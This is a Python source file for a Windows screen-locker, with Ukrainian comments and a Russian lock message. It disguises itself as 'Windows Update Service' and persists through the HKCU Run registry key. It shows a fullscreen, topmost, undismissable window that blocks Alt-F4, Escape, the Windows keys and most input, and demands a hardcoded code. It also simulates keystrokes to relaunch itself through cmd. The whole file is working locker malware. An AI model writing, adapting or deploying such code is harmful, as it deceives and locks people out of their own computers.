import tkinter as tk
import sys
import os
import winreg as reg
import ctypes
import time
import subprocess

try:
    import pyautogui
    import keyboard
except ImportError:
    pyautogui = None
    keyboard = None

PASSWORD = "1425"

# Змінюємо назву процесу
ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")

def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run",
                          0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateService", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key)
    except:
        pass

add_to_startup()

def emulate_cmd_launch():
    if pyautogui is None or keyboard is None:
        return  # якщо модулів немає — пропускаємо

    time.sleep(1)  # даємо час вікну з'явитися

    # Натискаємо Win + R
    keyboard.press('windows')
    keyboard.press('r')
    keyboard.release('r')
    keyboard.release('windows')
    time.sleep(0.5)

    # Вводимо "cmd"
    pyautogui.write('cmd')
    time.sleep(0.3)
    pyautogui.press('enter')
    time.sleep(1)

    # У cmd вводимо шлях до самого себе і запускаємо
    pyautogui.write(f'start "" "{sys.executable}"')
    pyautogui.press('enter')
    time.sleep(0.5)

    # Закриваємо cmd
    pyautogui.write('exit')
    pyautogui.press('enter')

def block_event(event=None):
    return "break"

def silent_close():
    return "break"

def check_password(event=None):
    if entry.get() == PASSWORD:
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key, "WindowsUpdateService")
            reg.CloseKey(key)
        except:
            pass
        root.destroy()
        sys.exit(0)
    else:
        entry.delete(0, tk.END)
        entry.focus_force()

root = tk.Tk()
root.title("")

root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')

hwnd = root.winfo_id()
style = ctypes.windll.user32.GetWindowLongPtrW(hwnd, -20)
ctypes.windll.user32.SetWindowLongPtrW(hwnd, -20, style | 0x80)

root.protocol("WM_DELETE_WINDOW", silent_close)
root.bind("<Alt-F4>", block_event)
root.bind("<Escape>", block_event)
root.bind("<Super_L>", block_event)
root.bind("<Super_R>", block_event)
root.bind_all("<Any-KeyPress>", lambda e: "break" if e.keysym != 'Return' else None)

lbl = tk.Label(root,
               text="СИСТЕМА ЗАБЛОКИРОВАНА\n\nВВЕДИТЕ КОД",
               font=("Consolas", 60, "bold"),
               bg='black',
               fg='#ff0000')
lbl.pack(expand=True, pady=200)

entry = tk.Entry(root,
                 font=("Consolas", 80),
                 width=8,
                 justify="center",
                 show="*",
                 bg='black',
                 fg='#00ff00',
                 insertbackground='#ff0000',
                 borderwidth=0,
                 highlightthickness=8,
                 highlightcolor='#ff0000')
entry.pack(pady=120)
entry.focus_force()
entry.bind("<Return>", check_password)

root.config(cursor="none")

# Запускаємо емуляцію через cmd після появи вікна
root.after(1000, emulate_cmd_launch)

root.mainloop()